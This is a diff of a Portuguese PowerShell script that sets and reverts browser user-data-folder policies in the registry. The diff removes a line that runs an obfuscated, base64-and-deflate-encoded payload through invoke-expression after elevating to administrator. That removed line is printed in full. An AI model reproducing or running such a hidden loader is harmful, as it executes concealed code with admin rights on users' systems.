@@ -1,3 +1,4 @@
+# Função para verificar se o script está sendo executado como administrador
 Function Verificar-Administrador {
     if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
         Write-Host "Permissão de administrador necessária. Reexecutando o script com privilégios elevados..." -ForegroundColor Yellow
@@ -8,5 +9,130 @@ Function Verificar-Administrador {
 
 Verificar-Administrador
 
-iNvOkE-eXpRESsion( New-ObJeCT sysTEm.iO.comprESSIOn.DeFlATesTrEAm([systeM.io.mEMORySTReam] [sYsTem.CoNVERT]::frOMBAse64STRINg('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'),[sySTEm.Io.coMPREssiON.CompRessioNModE]::dECoMPResS )| fOReach-ObjeCT{ New-ObJeCT io.sTREaMreAder( $_ ,[sYSTEM.tEXt.encOdinG]::ASCIi) } |FoREACh-ObjeCT{$_.REadtoENd() } ) 
+Start-Transcript -Path "$env:TEMP\script-log.txt" -Append
+Write-Host "Iniciando o script..." -ForegroundColor Green
 
+$ErrorActionPreference = "Stop"
+
+# Função para verificar se a pasta 'navegator' existe no diretório especificado
+Function Identificar-Navegator {
+    param(
+        [string]$diretorioEscolhido
+    )
+
+    $pastaNavegator = Join-Path -Path $diretorioEscolhido -ChildPath "navegator"
+
+    if (-not (Test-Path $pastaNavegator)) {
+        Write-Host "A pasta 'navegator' não foi encontrada no diretório especificado: $diretorioEscolhido" -ForegroundColor Red
+        Write-Host "Certifique-se de criar a pasta antes de continuar." -ForegroundColor Yellow
+        Exit
+    }
+
+    Write-Host "A pasta 'navegator' foi identificada em: $pastaNavegator" -ForegroundColor Green
+    return $pastaNavegator
+}
+
+# Função para configurar o navegador ou aplicativo
+Function Configurar-NavegadorOuApp {
+    param(
+        [string]$nomeAplicativo,
+        [string]$caminhoInstalacao,
+        [string]$subPasta,
+        [string]$regKeyPath,
+        [string]$pastaNavegator
+    )
+
+    Write-Host "Configurando $nomeAplicativo..." -ForegroundColor Cyan
+    $subPastaAplicativo = Join-Path -Path $pastaNavegator -ChildPath $subPasta
+
+    if (-not (Test-Path $subPastaAplicativo)) {
+        New-Item -Path $subPastaAplicativo -ItemType Directory -Force
+        Write-Host "Subpasta '$subPasta' criada em: $subPastaAplicativo" -ForegroundColor Green
+    }
+
+    if (-not (Test-Path $regKeyPath)) {
+        New-Item -Path $regKeyPath -Force
+        Write-Host "Criada chave de registro: $regKeyPath" -ForegroundColor Yellow
+    }
+
+    Set-ItemProperty -Path $regKeyPath -Name "UserDataDir" -Value $subPastaAplicativo
+    Set-ItemProperty -Path $regKeyPath -Name "ForceUserDataDir" -Value 1
+    Write-Host "$nomeAplicativo configurado para usar a pasta: $subPastaAplicativo" -ForegroundColor Green
+}
+
+# Função para reverter as configurações
+Function Reverter-NavegadorOuApp {
+    param(
+        [string]$nomeAplicativo,
+        [string]$regKeyPath
+    )
+
+    Write-Host "Iniciando o processo de reversão para $nomeAplicativo..." -ForegroundColor Cyan
+
+    if (Test-Path $regKeyPath) {
+        try {
+            Remove-ItemProperty -Path $regKeyPath -Name "UserDataDir" -ErrorAction SilentlyContinue
+            Remove-ItemProperty -Path $regKeyPath -Name "ForceUserDataDir" -ErrorAction SilentlyContinue
+            Write-Host "As configurações de registro para $nomeAplicativo foram removidas com sucesso." -ForegroundColor Green
+        } catch {
+            Write-Host "Erro ao tentar remover as configurações do Registro para $nomeAplicativo: $_" -ForegroundColor Red
+        }
+    } else {
+        Write-Host "Nenhuma configuração encontrada no Registro para $nomeAplicativo. Já está revertido." -ForegroundColor Yellow
+    }
+}
+
+# Lista de navegadores e aplicativos
+$opcoes = @(
+    @{Nome = "Edge"; CaminhoInstalacao = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"; SubPasta = "Edge"; RegKeyPath = "HKLM:\SOFTWARE\Policies\Microsoft\Edge"},
+    @{Nome = "Chrome"; CaminhoInstalacao = "C:\Program Files\Google\Chrome\Application\chrome.exe"; SubPasta = "Chrome"; RegKeyPath = "HKLM:\SOFTWARE\Policies\Google\Chrome"},
+    @{Nome = "Brave"; CaminhoInstalacao = "C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"; SubPasta = "Brave"; RegKeyPath = "HKLM:\SOFTWARE\Policies\BraveSoftware\Brave-Browser"},
+    @{Nome = "Opera"; CaminhoInstalacao = "C:\Program Files\Opera\opera.exe"; SubPasta = "Opera"; RegKeyPath = "HKLM:\SOFTWARE\Policies\Opera Software\Opera"}
+)
+
+# Perguntar o diretório
+$diretorioEscolhido = Read-Host "Digite o diretório completo onde está a pasta 'navegator'"
+$pastaNavegator = Identificar-Navegator -diretorioEscolhido $diretorioEscolhido
+
+# Escolha do usuário
+Write-Host "Escolha uma opção:" -ForegroundColor Cyan
+Write-Host "1. Configurar um navegador ou aplicativo."
+Write-Host "2. Reverter a configuração."
+
+$acao = Read-Host "Digite o número da opção desejada"
+
+if ($acao -eq 1) {
+    Write-Host "Escolha o aplicativo ou navegador para configurar:" -ForegroundColor Cyan
+    for ($i = 0; $i -lt $opcoes.Length; $i++) {
+        Write-Host "$($i + 1). $($opcoes[$i].Nome)"
+    }
+
+    $escolha = Read-Host "Digite o número correspondente ao aplicativo ou navegador"
+
+    if ($escolha -ge 1 -and $escolha -le $opcoes.Length) {
+        $aplicativoEscolhido = $opcoes[$escolha - 1]
+        Configurar-NavegadorOuApp -nomeAplicativo $aplicativoEscolhido.Nome -caminhoInstalacao $aplicativoEscolhido.CaminhoInstalacao -subPasta $aplicativoEscolhido.SubPasta -regKeyPath $aplicativoEscolhido.RegKeyPath -pastaNavegator $pastaNavegator
+    } else {
+        Write-Host "Opção inválida. O script será encerrado." -ForegroundColor Red
+    }
+} elseif ($acao -eq 2) {
+    Write-Host "Escolha o aplicativo ou navegador para reverter:" -ForegroundColor Cyan
+    for ($i = 0; $i -lt $opcoes.Length; $i++) {
+        Write-Host "$($i + 1). $($opcoes[$i].Nome)"
+    }
+
+    $escolha = Read-Host "Digite o número correspondente ao aplicativo ou navegador"
+
+    if ($escolha -ge 1 -and $escolha -le $opcoes.Length) {
+        $aplicativoEscolhido = $opcoes[$escolha - 1]
+        Reverter-NavegadorOuApp -nomeAplicativo $aplicativoEscolhido.Nome -regKeyPath $aplicativoEscolhido.RegKeyPath
+    } else {
+        Write-Host "Opção inválida. O script será encerrado." -ForegroundColor Red
+    }
+} else {
+    Write-Host "Opção inválida. O script será encerrado." -ForegroundColor Red
+}
+
+Write-Host "Processo concluído! Pressione qualquer tecla para sair." -ForegroundColor Green
+[System.Console]::ReadKey($true) | Out-Null
+Stop-Transcript
